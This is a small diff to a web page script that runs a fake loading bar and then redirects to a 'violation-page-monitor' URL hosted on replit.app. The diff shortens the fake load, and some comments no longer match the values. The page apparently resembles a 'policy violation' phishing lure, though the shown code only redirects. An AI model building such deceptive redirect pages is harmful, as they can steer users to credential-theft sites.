@@ -60,7 +60,7 @@
                 const loadingAnimation = setInterval(() => {
                     progress++;
                     progressBar.style.width = progress + '%';
-                    if (progress >= 100) {
+                    if (progress >= 10) {
                         clearInterval(loadingAnimation);
 
                         // Wait 5 seconds before redirecting
@@ -68,7 +68,7 @@
                             window.location.href = "https://violation-page-monitor.replit.app/request"; // Replace with your target URL
                         }, 1000);
                     }
-                }, 50); // Adjust speed of loading bar (50ms for smooth animation)
+                }, 100); // Adjust speed of loading bar (50ms for smooth animation)
             }
         })();
 
